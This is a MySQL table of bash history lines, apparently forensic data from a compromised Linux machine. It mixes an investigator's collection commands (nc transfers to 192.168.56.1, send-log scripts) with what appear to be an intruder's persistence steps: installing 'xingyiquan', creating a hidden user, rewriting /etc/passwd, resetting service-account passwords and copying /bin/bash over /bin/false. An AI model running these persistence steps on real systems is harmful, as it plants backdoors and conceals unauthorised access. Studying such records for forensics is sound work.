mysql> select * from histories order by recno;
+---------------------------+--------------------------------------------------------------------------------------------------------------------------------------------+-------+
| historyFilename           | historyCommand                                                                                                                             | recno |
| home/john/.bash_history   | sudo ./install                                                                                                                             |   241 |
| home/john/.bash_history   | ls                                                                                                                                         |   242 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   243 |
| home/john/.bash_history   | ls                                                                                                                                         |   244 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   245 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   246 |
| home/john/.bash_history   | sudo su -                                                                                                                                  |   247 |
| home/john/.bash_history   | ls                                                                                                                                         |   248 |
| home/john/.bash_history   | uname -a                                                                                                                                   |   249 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |   250 |
| home/john/.bash_history   | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   251 |
| home/john/.bash_history   | sudo su -                                                                                                                                  |   252 |
| home/.johnn/.bash_history | w                                                                                                                                          |   253 |
| home/.johnn/.bash_history | cat /etc/passwd                                                                                                                            |   254 |
| home/.johnn/.bash_history | su whoopsie                                                                                                                                |   255 |
| home/.johnn/.bash_history | su lightdm                                                                                                                                 |   256 |
| root/.bash_history        | fdisk -l                                                                                                                                   |   257 |
| root/.bash_history        | mkdir /mnt/good-bins                                                                                                                       |   258 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   259 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   260 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   261 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   262 |
| root/.bash_history        | ls                                                                                                                                         |   263 |
| root/.bash_history        | ls -al                                                                                                                                     |   264 |
| root/.bash_history        | cd /mnt/good-bins/scripts                                                                                                                  |   265 |
| root/.bash_history        | fdisk -l                                                                                                                                   |   266 |
| root/.bash_history        | mkdir /mnt/good-bins                                                                                                                       |   267 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   268 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   269 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   270 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   271 |
| root/.bash_history        | cd/mnt/good-bins                                                                                                                           |   272 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   273 |
| root/.bash_history        | ls                                                                                                                                         |   274 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   275 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   276 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   277 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   278 |
| root/.bash_history        | mdkir /mnt/good-bins                                                                                                                       |   279 |
| root/.bash_history        | mkdir /mnt/good-bins                                                                                                                       |   280 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   281 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   282 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   283 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   284 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   285 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   286 |
| root/.bash_history        | source scripts/setup-client.sh                                                                                                             |   287 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   288 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   289 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   290 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   291 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   292 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   293 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |   294 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |   295 |
| root/.bash_history        | exec bin/bash                                                                                                                              |   296 |
| root/.bash_history        | source scripts/setup-client.sh 10.0.2.2                                                                                                    |   297 |
| root/.bash_history        | cd scripts                                                                                                                                 |   298 |
| root/.bash_history        | ./initial-scan.sh                                                                                                                          |   299 |
| root/.bash_history        | ./send-file.sh /bin/bash                                                                                                                   |   300 |
| root/.bash_history        | ./send-file.sh /bin/false                                                                                                                  |   301 |
| home/john/.bash_history   | sudo apt-get update && sudo apt-get -y upgrade                                                                                             |   512 |
| home/john/.bash_history   | sudo apt-get install netcat                                                                                                                |   513 |
| home/john/.bash_history   | sudo apt-get install nmap                                                                                                                  |   514 |
| home/john/.bash_history   | service pure-ftpd start                                                                                                                    |   515 |
| home/john/.bash_history   | update-rc.d pure-ftpd defaults                                                                                                             |   516 |
| home/john/.bash_history   | nmap localhost                                                                                                                             |   517 |
| home/john/.bash_history   | update-rc.d ssh defaults                                                                                                                   |   518 |
| home/john/.bash_history   | apt-cache search chrome                                                                                                                    |   519 |
| home/john/.bash_history   | apt-get install chromium-browser                                                                                                           |   520 |
| home/john/.bash_history   | ls                                                                                                                                         |   521 |
| home/john/.bash_history   | cd xingyiquan/                                                                                                                             |   522 |
| home/john/.bash_history   | ls                                                                                                                                         |   523 |
| home/john/.bash_history   | cd                                                                                                                                         |   524 |
| home/john/.bash_history   | ls                                                                                                                                         |   525 |
| home/john/.bash_history   | pwd                                                                                                                                        |   526 |
| home/john/.bash_history   | cd Downloads/                                                                                                                              |   527 |
| home/john/.bash_history   | ls                                                                                                                                         |   528 |
| home/john/.bash_history   | tar xzvf xingyiquan.tar.gz                                                                                                                 |   529 |
| home/john/.bash_history   | ls                                                                                                                                         |   530 |
| home/john/.bash_history   | apt-cache search ssh                                                                                                                       |   531 |
| home/john/.bash_history   | apt-cache search openssh                                                                                                                   |   532 |
| home/john/.bash_history   | sudo apt-get install openssh-server                                                                                                        |   533 |
| home/john/.bash_history   | apt-cache search ftp-server                                                                                                                |   534 |
| home/john/.bash_history   | sudo apt-get install pure-ftpd                                                                                                             |   535 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   536 |
| home/john/.bash_history   | mkdir /mnt/x64                                                                                                                             |   537 |
| home/john/.bash_history   | mount /dev/sdb2 /mnt/x64                                                                                                                   |   538 |
| home/john/.bash_history   | cd /mnt/x64                                                                                                                                |   539 |
| home/john/.bash_history   | ls                                                                                                                                         |   540 |
| home/john/.bash_history   | cd x64                                                                                                                                     |   541 |
| home/john/.bash_history   | ls                                                                                                                                         |   542 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   543 |
| home/john/.bash_history   | export PATH=/mnt/x64/x64/sbin;/mnt/x64/x64/bin                                                                                             |   544 |
| home/john/.bash_history   | echo $PATH                                                                                                                                 |   545 |
| home/john/.bash_history   | export PATH=/mnt/x64/x64/sbin:/mnt/x64/x64/bin                                                                                             |   546 |
| home/john/.bash_history   | echo $PATH                                                                                                                                 |   547 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   548 |
| home/john/.bash_history   | mount                                                                                                                                      |   549 |
| home/john/.bash_history   | cd mnt/x64/x64/                                                                                                                            |   550 |
| home/john/.bash_history   | l                                                                                                                                          |   551 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   552 |
| home/john/.bash_history   | export PATH=/mnt/x64/x64/bin:/mnt/x64/x64/sbin                                                                                             |   553 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=/mnt/x64/x64/lib:/mnt/x64/x64/lib64                                                                                 |   554 |
| home/john/.bash_history   | ls                                                                                                                                         |   555 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |   556 |
| home/john/.bash_history   | ls /dev/sd*                                                                                                                                |   557 |
| home/john/.bash_history   | cd /media/john                                                                                                                             |   558 |
| home/john/.bash_history   | ls                                                                                                                                         |   559 |
| home/john/.bash_history   | ls /dev/sd*                                                                                                                                |   560 |
| home/john/.bash_history   | cd /                                                                                                                                       |   561 |
| home/john/.bash_history   | mount                                                                                                                                      |   562 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   563 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |   564 |
| home/john/.bash_history   | ls                                                                                                                                         |   565 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   566 |
| home/john/.bash_history   | export PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/bin:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/sbin             |   567 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib64:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib |   568 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |   569 |
| home/john/.bash_history   | mount                                                                                                                                      |   570 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   571 |
| home/john/.bash_history   | mount                                                                                                                                      |   572 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |   573 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   574 |
| home/john/.bash_history   | export PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/bin:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/sbin             |   575 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib64:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib |   576 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |   577 |
| home/john/.bash_history   | date | nc 192.168.56.1 9999                                                                                                                |   578 |
| home/john/.bash_history   | uname -a | nc 192.168.56.1 9999                                                                                                            |   579 |
| home/john/.bash_history   | cd                                                                                                                                         |   580 |
| home/john/.bash_history   | cd /bin                                                                                                                                    |   581 |
| home/john/.bash_history   | nc 192.168.56.1 4444 < /bin/bash                                                                                                           |   582 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   583 |
| home/john/.bash_history   | cd x64                                                                                                                                     |   584 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   585 |
| home/john/.bash_history   | export PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/bin:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/sbin             |   586 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib64:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib |   587 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |   588 |
| home/john/.bash_history   | cd/                                                                                                                                        |   589 |
| home/john/.bash_history   | cd                                                                                                                                         |   590 |
| home/john/.bash_history   | date | nc 192.168.56.1 9999                                                                                                                |   591 |
| home/john/.bash_history   | uname -a | nc 192.168.56.1 9999                                                                                                            |   592 |
| home/john/.bash_history   | nc 192.168.56.1 4444 < /bin/bash                                                                                                           |   593 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |   594 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   595 |
| home/john/.bash_history   | ls                                                                                                                                         |   596 |
| home/john/.bash_history   | ls /mnt                                                                                                                                    |   597 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |   598 |
| home/john/.bash_history   | cd x64/                                                                                                                                    |   599 |
| home/john/.bash_history   | ls                                                                                                                                         |   600 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   601 |
| home/john/.bash_history   | export PATH=$(pwd)/bin:$(pwd)/sbin                                                                                                         |   602 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |   603 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |   604 |
| home/john/.bash_history   | echo $PATH                                                                                                                                 |   605 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |   606 |
| home/john/.bash_history   | bash bin/send-log.sh date                                                                                                                  |   607 |
| home/john/.bash_history   | bash bin/send-log.sh ifconfig                                                                                                              |   608 |
| home/john/.bash_history   | bash bin/send-log.sh ps -ef                                                                                                                |   609 |
| home/john/.bash_history   | bash bin/send-log.sh ps -ef lsof                                                                                                           |   610 |
| home/john/.bash_history   | bash bin/send-log.sh lsof                                                                                                                  |   611 |
| home/john/.bash_history   | bash bin/send-log.sh route                                                                                                                 |   612 |
| home/john/.bash_history   | bash bin/send-log.sh netstat                                                                                                               |   613 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/bash                                                                                                            |   614 |
| home/john/.bash_history   | /usr/bin/lsof                                                                                                                              |   615 |
| home/john/.bash_history   | cd bin                                                                                                                                     |   616 |
| home/john/.bash_history   | ls                                                                                                                                         |   617 |
| home/john/.bash_history   | cp /usr/bin/lsof ./.                                                                                                                       |   618 |
| home/john/.bash_history   | cp /usr/bin/basename ./.                                                                                                                   |   619 |
| home/john/.bash_history   | ls                                                                                                                                         |   620 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   621 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/bash                                                                                                            |   622 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |   623 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   624 |
| home/john/.bash_history   | cd x64                                                                                                                                     |   625 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   626 |
| home/john/.bash_history   | export PATH=$(pwd)/bin:$(pwd)/sbin                                                                                                         |   627 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |   628 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |   629 |
| home/john/.bash_history   | bash bin/send-log.sh date                                                                                                                  |   630 |
| home/john/.bash_history   | bash bin/send-log.sh ifconfig                                                                                                              |   631 |
| home/john/.bash_history   | bash bin/send-log.sh netstat                                                                                                               |   632 |
| home/john/.bash_history   | bash bin/send-log.sh lsof                                                                                                                  |   633 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/bash                                                                                                            |   634 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/false                                                                                                           |   635 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   636 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |   637 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   638 |
| home/john/.bash_history   | export PATH=$(pwd)/bin:$(pwd)/sbin                                                                                                         |   639 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |   640 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |   641 |
| home/john/.bash_history   | bash bin/inital-scan.sh                                                                                                                    |   642 |
| home/john/.bash_history   | bash bin/initial-scan.sh                                                                                                                   |   643 |
| home/john/.bash_history   | cd                                                                                                                                         |   644 |
| home/john/.bash_history   | mount                                                                                                                                      |   645 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |   646 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |   647 |
| home/john/.bash_history   | w                                                                                                                                          |   648 |
| home/john/.bash_history   | useradd johnn                                                                                                                              |   649 |
| home/john/.bash_history   | userdel johnn                                                                                                                              |   650 |
| home/john/.bash_history   | adduser johnn                                                                                                                              |   651 |
| home/john/.bash_history   | cp /bin/true /bin/false                                                                                                                    |   652 |
| home/john/.bash_history   | ls -l /bin/false                                                                                                                           |   653 |
| home/john/.bash_history   | passwd whoopsie                                                                                                                            |   654 |
| home/john/.bash_history   | passwd lightdm                                                                                                                             |   655 |
| home/john/.bash_history   | cp /bin/bash /bin/false                                                                                                                    |   656 |
| home/john/.bash_history   | vi /etc/gr/group                                                                                                                           |   657 |
| home/john/.bash_history   | vi /etc/groups                                                                                                                             |   658 |
| home/john/.bash_history   | cd /etc                                                                                                                                    |   659 |
| home/john/.bash_history   | ls gr*                                                                                                                                     |   660 |
| home/john/.bash_history   | cat passwd                                                                                                                                 |   661 |
| home/john/.bash_history   | cd /home                                                                                                                                   |   662 |
| home/john/.bash_history   | ls                                                                                                                                         |   663 |
| home/john/.bash_history   | mv johnn .johnn                                                                                                                            |   664 |
| home/john/.bash_history   | ls                                                                                                                                         |   665 |
| home/john/.bash_history   | ls -l                                                                                                                                      |   666 |
| home/john/.bash_history   | vi /etc/passwd                                                                                                                             |   667 |
| home/john/.bash_history   | man sed                                                                                                                                    |   668 |
| home/john/.bash_history   | sed #/home/johnn#/home/.johnn# /etc/passwd                                                                                                 |   669 |
| home/john/.bash_history   | sed -i 's#/home/johnn#/home/.johnn#' /etc/passwd                                                                                           |   670 |
| home/john/.bash_history   | tail /etc/passwd                                                                                                                           |   671 |
| home/john/.bash_history   | ./install                                                                                                                                  |   672 |
| home/john/.bash_history   | nmap localhost                                                                                                                             |   673 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   674 |
| home/john/.bash_history   | ls                                                                                                                                         |   675 |
| home/john/.bash_history   | pwd                                                                                                                                        |   676 |
| home/john/.bash_history   | ls                                                                                                                                         |   677 |
| home/john/.bash_history   | ls -a                                                                                                                                      |   678 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   679 |
| home/john/.bash_history   | pwd                                                                                                                                        |   680 |
| home/john/.bash_history   | cd Downloads/                                                                                                                              |   681 |
| home/john/.bash_history   | ls                                                                                                                                         |   682 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   683 |
| home/john/.bash_history   | cd /home                                                                                                                                   |   684 |
| home/john/.bash_history   | ls                                                                                                                                         |   685 |
| home/john/.bash_history   | ls -a                                                                                                                                      |   686 |
| home/john/.bash_history   | clear                                                                                                                                      |   687 |
| home/john/.bash_history   | ls                                                                                                                                         |   688 |
| home/john/.bash_history   | cd Downloads/                                                                                                                              |   689 |
| home/john/.bash_history   | ls                                                                                                                                         |   690 |
| home/john/.bash_history   | cd xingyiquan/                                                                                                                             |   691 |
| home/john/.bash_history   | ls                                                                                                                                         |   692 |
| home/john/.bash_history   | more README                                                                                                                                |   693 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |   694 |
| home/john/.bash_history   | ls                                                                                                                                         |   695 |
| home/john/.bash_history   | cd ..                                                                                                                                      |   696 |
| home/john/.bash_history   | ls                                                                                                                                         |   697 |
| home/john/.bash_history   | nmap localhost                                                                                                                             |   698 |
| home/john/.bash_history   | q                                                                                                                                          |   699 |
| home/john/.bash_history   | export PATH=$(pwd)/sbin:$(pwd)/bin                                                                                                         |   700 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |   701 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |   702 |
